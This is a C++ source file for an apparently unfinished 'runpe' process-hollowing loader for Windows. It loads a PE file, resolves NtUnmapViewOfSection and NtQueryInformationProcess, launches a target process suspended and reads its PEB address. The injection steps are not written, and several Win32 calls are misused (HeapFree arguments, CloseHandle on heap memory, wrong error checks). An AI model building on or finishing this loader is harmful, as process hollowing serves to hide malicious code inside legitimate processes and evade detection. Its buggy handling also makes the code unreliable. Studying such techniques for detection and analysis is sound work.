#include <Windows.h>
#include <cstdio>
#include <winternl.h>

typedef NTSTATUS(*ntQueryProcessInformation)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(*ntUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
HANDLE GetFileContent(const char* lpFilePath)
{
    const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] An error occured when trying to open the PE file !");
        CloseHandle(hFile);
        return nullptr;
    }

    const DWORD dFileSize = GetFileSize(hFile, nullptr);
    if (dFileSize == INVALID_FILE_SIZE)
    {
        printf("[-] An error occured when trying to get the PE file size !");
        CloseHandle(hFile);
        return nullptr;
    }

    const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
    if (hFileContent == INVALID_HANDLE_VALUE)
    {
        printf("[-] An error occured when trying to allocate memory for the PE file content !");
        CloseHandle(hFile);
        CloseHandle(hFileContent);
        return nullptr;
    }

    const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
    if (!bFileRead)
    {
        printf("[-] An error occured when trying to read the PE file content !");
        CloseHandle(hFile);
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);

        return nullptr;
    }

    CloseHandle(hFile);
    return hFileContent;
}

/**
 * Function wich check if the source file is a x86 PE file.
 * \param hFileContent : handle to the source file content.
 * \return : TRUE if the source file is a x86 PE else FALSE.
 */
BOOL IsPE32(const HANDLE hFileContent)
{
    const auto pImageDOSHeader = (PIMAGE_DOS_HEADER)hFileContent;
    const auto pImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)pImageDOSHeader + pImageDOSHeader->e_lfanew);
    if (pImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return TRUE;

    return FALSE;
}

int main(const int argc, char* argv[])
{
    char* lpFilePath;
    char* lpTargetProcessPath;

    if (argc == 3)
    {
        lpFilePath = argv[1];
        lpTargetProcessPath = argv[2];
    }
    else
    {
        printf("[HELP] runpe.exe <pe_file> <target_process>");
        return -1;
    }

    const HANDLE hFileContent = GetFileContent(lpFilePath);
    if (hFileContent == INVALID_HANDLE_VALUE)
    {
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);
        return -1;
    }

    const HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule == INVALID_HANDLE_VALUE || hModule == nullptr)
    {
        printf("An error is occured when trying to load \"ntdll.dll\".\n");
        if (hModule != nullptr)
            CloseHandle(hModule);
        if (hFileContent != nullptr)
            HeapFree(hFileContent, 0, nullptr);
        return -1;
    }

    const auto NtQueryInformationProcess = (ntQueryProcessInformation)GetProcAddress(hModule, "NtQueryInformationProcess");
    if (NtQueryInformationProcess == nullptr)
    {
        printf("An error is occured when trying to retrieve \"NtQueryInformationProcess\".\n");
        if (hModule != nullptr)
            CloseHandle(hModule);
        if (hFileContent != nullptr)
            HeapFree(hFileContent, 0, nullptr);
        return -1;
    }

    const auto NtUnmapViewOfSection = (ntUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection == nullptr)
    {
        printf("An error is occured when trying to retrieve \"NtUnmapViewOfSection\".\n");
        if (hModule != nullptr)
            CloseHandle(hModule);
        if (hFileContent != nullptr)
            HeapFree(hFileContent, 0, nullptr);
        return -1;
    }

    printf("[PROCESS HOLOWING]\n");
    printf("Source file content at 0x%X\n", (UINT)(uintptr_t)hFileContent);
    printf("NtQueryInformationProcess at 0x%X\n", (UINT)(uintptr_t)NtQueryInformationProcess);
    printf("NtUnmapViewOfSection at 0x%X\n", (UINT)(uintptr_t)NtUnmapViewOfSection);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    const BOOL bProcessCreation = CreateProcessA(lpTargetProcessPath, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
    if (!bProcessCreation)
    {
        printf("An error is occured when trying to create the target process.\n");
        if (hFileContent != nullptr)
            HeapFree(hFileContent, 0, nullptr);
        if (pi.hProcess != nullptr)
            CloseHandle(pi.hProcess);
        if (pi.hThread != nullptr)
            CloseHandle(pi.hThread);
        return -1;
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    const NTSTATUS QueryStatus = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    if (QueryStatus < 0)
    {
        printf("An error is occured when trying to query informations on the target process\n.");
        if (hFileContent != nullptr)
            HeapFree(hFileContent, 0, nullptr);
        if (pi.hProcess != nullptr)
            CloseHandle(pi.hProcess);
        if (pi.hThread != nullptr)
            CloseHandle(pi.hThread);
        return -1;
    }

    const auto uPEBAddress = (uintptr_t) pbi.PebBaseAddress;
    printf("PEB address at 0x%X", (UINT)uPEBAddress);

    system("PAUSE");

    if (hFileContent != nullptr)
        HeapFree(hFileContent, 0, nullptr);

    if (pi.hProcess != nullptr)
        CloseHandle(pi.hProcess);

    if (pi.hThread != nullptr)
        CloseHandle(pi.hThread);

    return 0;
}